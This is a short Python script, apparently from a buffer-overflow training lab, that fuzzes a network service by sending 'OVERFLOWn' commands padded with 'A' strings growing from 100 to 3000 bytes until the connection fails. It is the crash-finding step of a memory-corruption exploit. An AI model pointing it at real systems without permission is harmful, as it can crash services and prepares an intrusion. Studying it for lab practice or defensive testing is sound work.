import socket, time, sys

if len(sys.argv) < 4 :
    print("[-] python fuzzer.py [ip] [port] [number]")
    sys.exit(0)

ip = str(sys.argv[1])
port = int(sys.argv[2])
number = str(sys.argv[3])
timeout = 5
print("[+] Fuzzing to OVERFLOW" + number)

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW" + number + " " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
